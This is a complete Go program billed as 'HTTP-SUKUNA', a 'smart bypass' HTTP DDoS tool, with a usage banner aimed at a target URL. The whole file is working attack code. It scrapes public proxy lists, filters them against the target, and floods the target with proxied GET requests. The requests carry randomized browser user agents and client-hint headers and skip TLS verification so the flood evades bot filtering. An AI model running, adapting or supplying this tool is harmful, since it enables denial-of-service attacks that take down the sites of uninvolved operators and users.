package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var limit = 2048
var secFetchUser, acceptEncoding, secFetchDest, secFetchMode, secFetchSite, accept, priority string

func getRandomInt(min, max int) int {
	return rand.Intn(max-min+1) + min
}

func randStr(length int) string {
	const characters = "0123456789"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = characters[rand.Intn(len(characters))]
	}
	return string(result)
}

func getRandomValue(values []string) string {
	return values[rand.Intn(len(values))]
}

func px(target string) {
	var mu sync.Mutex
	fmt.Println("SUKUNA: Get proxy!")
	os.Remove("http.txt")
	file, err := os.Create("http.txt")
	if err != nil {
		fmt.Println("SUKUNA: Error creating proxy.txt:", err)
		return
	}
	defer file.Close()
	proxyAPIs := []string{
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		//"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
		//"https://raw.githubusercontent.com/ErcinDedeoglu/proxies/refs/heads/main/proxies/http.txt",
		//"https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/http/http.txt",
		//"https://raw.githubusercontent.com/yemixzy/proxy-list/refs/heads/main/proxies/unchecked.txt",
		//"https://raw.githubusercontent.com/Noctiro/getproxy/refs/heads/master/file/http.txt",
	}
	var proxies []string
	for _, api := range proxyAPIs {
		resp, err := http.Get(api)
		if err != nil {
			fmt.Printf("SUKUNA: Error retrieving proxy from %s: %v\n", api, err)
			continue
		}
		defer resp.Body.Close()

		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			proxy := strings.TrimSpace(scanner.Text())
			if proxy != "" {
				proxies = append(proxies, proxy)
			}
		}

		if err := scanner.Err(); err != nil {
			fmt.Printf("SUKUNA: Error reading response body: %v\n", err)
			continue
		}
	}
	var wg sync.WaitGroup
	proxyChan := make(chan string)
	totalProxies := len(proxies)
	workingProxies := 0
	suk := 2048
	suku := make(chan struct{}, suk)

	for i, proxy := range proxies {
		suku <- struct{}{}
		time.Sleep(1 * time.Millisecond)
		wg.Add(1)
		go func(proxy string, index int) {
			defer wg.Done()
			if checkProxy(proxy, target) {
				proxyChan <- proxy
			}
			mu.Lock()
			fmt.Printf("SUKUNA: Checked %d/%d proxies (%.2f%%) \r", index+1, totalProxies, float64(index+1)/float64(totalProxies)*100)
			mu.Unlock()
			defer func() { <-suku }()
		}(proxy, i)
	}

	go func() {
		wg.Wait()
		close(proxyChan)
		mu.Lock()
		fmt.Printf("SUKUNA: Checked %d/%d proxies (100.00%%) - Working: %d\n", totalProxies, totalProxies, workingProxies)
		mu.Unlock()
	}()

	for proxy := range proxyChan {
		workingProxies++
		_, err := file.WriteString(proxy + "\n")
		if err != nil {
			fmt.Printf("SUKUNA: Error writing proxy to file: %v\n", err)
		}
	}

	fmt.Printf("SUKUNA : %d proxy!\n", workingProxies)
}

func checkProxy(proxy string, target string) bool {
	proxyURL, err := url.Parse("http://" + proxy)
	if err != nil {
		return false
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	resp, err := client.Get(target)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return true
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println(`
      🔥 HTTP-SUKUNA 1.1 smart bypass http-ddos 🔥
      💀 Updated: 07.12.2024 💀 Engineered by @sukuna-c2 for sukuna-c2
      🧠 Developers: @lequan (recoding) | @sukuna-c2 (AI logic) 🧠

      Usage & Example:
        ./http-sukuna <target> <time> <threads> <ratelimit> <proxy.txt/proxy>
        ./http-sukuna "https://target.com" 120 10 90 proxy.txt
	./http-sukuna "https://target.com" 120 10 90 proxy (auto get proxy)`)
		os.Exit(1)
	}
	target := os.Args[1]
	t, _ := strconv.Atoi(os.Args[2])
	thread, _ := strconv.Atoi(os.Args[3])
	rate, _ := strconv.Atoi(os.Args[4])
	var proxyList []string
	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	ur := u.Hostname()
	multi := thread * limit
	jobs := make(chan func(), multi)
	for i := 0; i < multi; i++ {
		go func() {
			for job := range jobs {
				job()
			}
		}()
	}
	maxcpu := runtime.NumCPU()
	if thread > maxcpu {
		fmt.Printf("SUKUNA : Threads can not high %d", maxcpu)
		os.Exit(0)
	}
	if rate > 90 {
		fmt.Println("SUKUNA : Rate can not high 90")
		os.Exit(0)
	}
	proxyFile := os.Args[5]
	if proxyFile == "proxy" {
		px(target)
		file, err := os.Open("http.txt")
		if err != nil {
			log.Println("SUKUNA : Proxy err!")
		}
		defer file.Close()
		var proxies []string
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			proxies = append(proxies, scanner.Text())
		}
		proxyList = proxies
	} else {
		file, err := os.Open(proxyFile)
		if err != nil {
			log.Println("SUKUNA : Proxy err!")
		}
		defer file.Close()
		var proxies []string
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			proxies = append(proxies, scanner.Text())
		}
		proxyList = proxies
	}
	runtime.GOMAXPROCS(runtime.NumCPU())
	blacklist := make(map[string]bool)
	var mu sync.Mutex
	fmt.Println("SUKUNA : Attack send")
	for i := 0; i < thread; i++ {
		go func() {
			for {
				jobs <- func() {
					mu.Lock()
					var px string
					for {
						rand.Seed(rand.Int63())
						randomIndex := rand.Intn(len(proxyList))
						px = proxyList[randomIndex]
						if !blacklist[px] {
							break
						}
					}
					mu.Unlock()
					proxy := "http://" + px
					proxyUrl, err := url.Parse(proxy)
					if err != nil {
						mu.Lock()
						blacklist[px] = true
						mu.Unlock()
						return
					}
					dialer := &net.Dialer{
						Timeout:   10 * time.Second,
						KeepAlive: 30 * time.Second,
					}
					tr := &http.Transport{
						Proxy:       http.ProxyURL(proxyUrl),
						DialContext: dialer.DialContext,
						TLSClientConfig: &tls.Config{
							NextProtos:               []string{"h2", "http/1.1"},
							MinVersion:               tls.VersionTLS12,
							MaxVersion:               tls.VersionTLS13,
							InsecureSkipVerify:       true,
							PreferServerCipherSuites: true,
							ServerName:               ur,
							ClientSessionCache:       tls.NewLRUClientSessionCache(0),
							CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
							CipherSuites: []uint16{
								tls.TLS_AES_128_GCM_SHA256,
								tls.TLS_AES_256_GCM_SHA384,
								tls.TLS_CHACHA20_POLY1305_SHA256,
							},
						},
						ForceAttemptHTTP2: true,
						MaxIdleConns:      100,
					}
					client := &http.Client{
						Transport: tr,
						Timeout:   30 * time.Second,
					}
					req, _ := http.NewRequest("GET", target, nil)
					rand.Seed(time.Now().UnixNano())
					a := getRandomInt(91, 131)
					b := getRandomInt(1000, 9999)
					c := getRandomInt(10, 99)
					d := "Google Chrome"
					var brandValue string
					brandValue = fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "%s";v="%d"`, a, d, a)
					switch a {
					case 121:
						brandValue = fmt.Sprintf(`"Not A(Brand";v="99", "%s";v="%d", "Chromium";v="%d"`, d, a, a)
					case 122:
						brandValue = fmt.Sprintf(`"Chromium";v="%d", "Not(A:Brand";v="24", "%s";v="%d"`, a, d, a)
					case 123:
						brandValue = fmt.Sprintf(`"%s";v="%d", "Not:A-Brand";v="8", "Chromium";v="%d"`, d, a, a)
					}
					operatingSystems := []string{"Windows NT 10.0", "Macintosh", "X11"}
					architectures := map[string]string{
						"Windows NT 10.0": "Win64; x64",
						"Macintosh":       fmt.Sprintf("Intel Mac OS X 1%s_%s_%s", randStr(1), randStr(1), randStr(1)),
						"X11": func() string {
							if rand.Float64() < 0.5 {
								return fmt.Sprintf("Linux x86_64; rv:%d.0", a)
							}
							return "Linux x86_64"
						}(),
					}
					randomOS := getRandomValue(operatingSystems)
					randomArch := architectures[randomOS]
					ua := []string{
						fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", randomOS, randomArch, a, b, c),
						fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36 Edg/%d", randomOS, randomArch, a, b, c, a),
						fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36 OPR/%d", randomOS, randomArch, a, b, c, a),
						fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%d.0) Gecko/20100101 Firefox/%d", randomOS, randomArch, a, a),
						fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36 Brave/%d.0.0.0", randomOS, randomArch, a, b, c, a),
					}
					randomUA := ua[rand.Intn(len(ua))]
					if rand.Float32() < 0.5 {
						secFetchUser = "?0"
					} else {
						secFetchUser = "?1"
					}
					if rand.Float32() < 0.5 {
						acceptEncoding = "gzip, deflate, br, zstd"
					} else {
						acceptEncoding = "gzip, deflate, br"
					}
					if rand.Float32() < 0.5 {
						secFetchDest = "document"
					} else {
						secFetchDest = "empty"
					}
					if rand.Float32() < 0.5 {
						secFetchMode = "navigate"
					} else {
						secFetchMode = "cors"
					}
					if rand.Float32() < 0.5 {
						secFetchSite = "none"
					} else {
						secFetchSite = "same-site"
					}
					if rand.Float32() < 0.5 {
						accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
					} else {
						accept = "application/json"
					}
					if rand.Float32() < 0.5 {
						priority = "u=0, i"
					} else {
						priority = "u=1, i"
					}
					platform := "Windows"
					req.Header.Set("sec-ch-ua", brandValue)
					req.Header.Set("sec-ch-ua-mobile", "?0")
					req.Header.Set("sec-ch-ua-platform", platform)
					req.Header.Set("user-agent", randomUA)
					req.Header.Set("accept", accept)
					req.Header.Set("sec-fetch-site", secFetchSite)
					req.Header.Set("sec-fetch-mode", secFetchMode)
					req.Header.Set("sec-fetch-user", secFetchUser)
					req.Header.Set("sec-fetch-dest", secFetchDest)
					req.Header.Set("accept-encoding", acceptEncoding)
					req.Header.Set("accept-language", "en-US,en;q=0.7")
					req.Header.Set("priority", priority)
					//fmt.Println(req.Header)
					aiRate := getRandomInt(10, rate)
					resh, err := client.Do(req)
					if err != nil {
						//fmt.Println(err)
						return
					}
					for i := 0; i < aiRate; i++ {
						go client.Do(req)
					}
					defer resh.Body.Close()
				}
				//time.Sleep(10 * time.Millisecond)
			}
		}()
	}
	time.Sleep(time.Duration(t) * time.Second)
	fmt.Println("SUKUNA : Attack end")
	os.Exit(0)
}
